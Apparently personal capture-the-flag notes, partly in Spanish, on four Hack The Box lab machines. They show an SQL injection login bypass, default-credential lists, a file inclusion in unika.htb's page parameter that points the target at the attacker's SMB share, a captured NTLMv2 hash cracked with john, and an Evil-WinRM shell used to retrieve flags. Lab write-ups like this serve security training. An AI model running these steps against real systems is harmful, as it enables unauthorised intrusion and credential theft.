Appointment
===========

10.129.148.198 
SQL Injection
PII: Personal Identificable Information

a' or 1=1--
Flag: 
Congratulations!

admin:admin
guest:guest
user:user
root:root
administrator:password

git clone https://github.com/OJ/gobuster.git
git clone https://github.com/danielmiessler/SecLists.git

Your flag is: e3d0796d002a446c0e622226f42e9672

SEQUEL
=======

10.129.234.142 

Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-06 21:53 UTC
Nmap scan report for 10.129.234.142
Host is up (0.12s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 85
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, DontAllowDatabaseTableColumn, SupportsTransactions, LongColumnFlag, ConnectWithDatabase, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, FoundRows, ODBCClient, SupportsLoadDataLocal, Speaks41ProtocolNew, InteractiveClient, SupportsCompression, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: B+Q6Y=fkgAOKiM)"l}NM
|_  Auth Plugin Name: mysql_native_password
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 228.23 seconds



Se conecta a la bbdd con 
mysql -h <ip> -u root 
SIn contraseña.
Se busca la SQL en la bbdd.

Flag: 7b4bec00d1a39e3dd4e021ec3d915da8



+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+


Sequel has been Pwned!
Congratulations
Akelarre
, best of luck in capturing flags ahead!

07 May 2022

PWN DATE

COCODRILE
=========



└─$ nmap -sC -sV 10.129.52.195 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-06 22:24 UTC
Nmap scan report for 10.129.52.195
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.125
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Smash - Bootstrap Business Template
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.70 seconds

wappalyzer   -> analiza páginas web


gobuster dir --url http://10.129.52.195 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html 

Flag: c7110277ac44d78b6a9fff2232434d16

Crocodile has been Pwned!
Congratulations
Akelarre
, best of luck in capturing flags ahead!

07 May 2022

PWN DATE


RESPONDER
=========

10.129.253.48 


NTLM: New Technology Lan Manager

-v : Increase the verbosity level (basically output more info)
-p- : This flag scans for all TCP ports ranging from 0-65535
-sV : Attempts to determine the version of the service running on a port
-sC : Scan with default NSE scripts
--min-rate : This is used to specify the minimum number of packets Nmap should send per
second; it speeds up the scan as the number goes higher

nmap -v -p- --min-rate 5000 -sV -sC 10.129.253.48 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-06 22:46 UTC
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 22:46
Completed NSE at 22:46, 0.00s elapsed
Initiating NSE at 22:46
Completed NSE at 22:46, 0.00s elapsed
Initiating NSE at 22:46
Completed NSE at 22:46, 0.00s elapsed
Initiating Ping Scan at 22:46
Scanning 10.129.253.48 [2 ports]
Completed Ping Scan at 22:46, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:46
Completed Parallel DNS resolution of 1 host. at 22:46, 0.03s elapsed
Initiating Connect Scan at 22:46
Scanning 10.129.253.48 [65535 ports]
Discovered open port 80/tcp on 10.129.253.48
Discovered open port 5985/tcp on 10.129.253.48
Discovered open port 7680/tcp on 10.129.253.48
Completed Connect Scan at 22:46, 33.46s elapsed (65535 total ports)
Initiating Service scan at 22:46
Scanning 3 services on 10.129.253.48
Completed Service scan at 22:47, 49.40s elapsed (3 services on 1 host)
NSE: Script scanning 10.129.253.48.
Initiating NSE at 22:47
Completed NSE at 22:47, 3.21s elapsed
Initiating NSE at 22:47
Completed NSE at 22:47, 0.56s elapsed
Initiating NSE at 22:47
Completed NSE at 22:47, 0.00s elapsed
Nmap scan report for 10.129.253.48
Host is up (0.13s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp open  pando-pub?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
Initiating NSE at 22:47
Completed NSE at 22:47, 0.00s elapsed
Initiating NSE at 22:47
Completed NSE at 22:47, 0.00s elapsed
Initiating NSE at 22:47
Completed NSE at 22:47, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.95 seconds


10.129.253.48 -> http://unika.htb/ -> Tiene configurados virtual hosts


echo "10.129.253.48 unika.htb" | sudo tee -a /etc/hosts



Warning: include(../windows/system32/drivers/etc/hosts): Failed to open stream: No such file or directory in C:\xampp\htdocs\index.php on line 11

Warning: include(): Failed opening '../windows/system32/drivers/etc/hosts' for inclusion (include_path='\xampp\php\PEAR') in C:\xampp\htdocs\index.php on line

view-source:http://unika.htb/index.php?page=../../windows/system32/drivers/etc/hosts

# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost


activamos responder:

sudo python responder -I tun0
─$ responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.1.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[!] Responder must be run as root.
                                                                                  
┌──(kali㉿kali)-[~/Documents/HackTheBOX/TIER 1]
└─$ sudo responder -I tun0       
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.1.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.125]
    Responder IPv6             [dead:beef:2::107b]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-AXEV0ZQ99P7]
    Responder Domain Name      [S0J1.LOCAL]
    Responder DCE-RPC Port     [47080]

[+] Listening for events...                                                       

http://unika.htb/?page=//10.10.14.25/somefile

NetNTLMv2 challenge/response <<<<<<< Reto Desafío/Respuesta

[SMB] NTLMv2-SSP Client   : ::ffff:10.129.253.48
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:3553de4f62961e7b:FCB99B7B87F7D873B6DFBB2D00EA6436:010100000000000000D10A629F61D8018E193E052E42D7490000000002000800530030004A00310001001E00570049004E002D00410058004500560030005A005100390039005000370004003400570049004E002D00410058004500560030005A00510039003900500037002E00530030004A0031002E004C004F00430041004C0003001400530030004A0031002E004C004F00430041004C0005001400530030004A0031002E004C004F00430041004C000700080000D10A629F61D80106000400020000000800300030000000000000000100000000200000589D7B053612EB9D778DB4F6BBB88DF194DB04DC0DA1B376DC9683F66A5EAD9C0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100320035000000000000000000


└─$ john -w=/usr/share/wordlists/rockyou.txt COCODRILE_hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:01 DONE (2022-05-06 23:30) 0.5494g/s 2250p/s 2250c/s 2250C/s adriano..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 


./evil-winrm.rb -i 10.129.253.48 -u administrator -p badminton

*Evil-WinRM* PS C:\Users\mike\Desktop> download flag.txt /home/kali/flag.txt
Info: Downloading flag.txt to /home/kali/flag.txt

                                                             
Info: Download successful!

*Evil-WinRM* PS C:\Users\mike\Desktop> type flag.txt
ea81b7afddd03efaa0945333ed147fac
*Evil-WinRM* PS C:\Users\mike\Desktop> 


Responder has been Pwned!
Congratulations
Akelarre
, best of luck in capturing flags ahead!

07 May 2022

PWN DATE


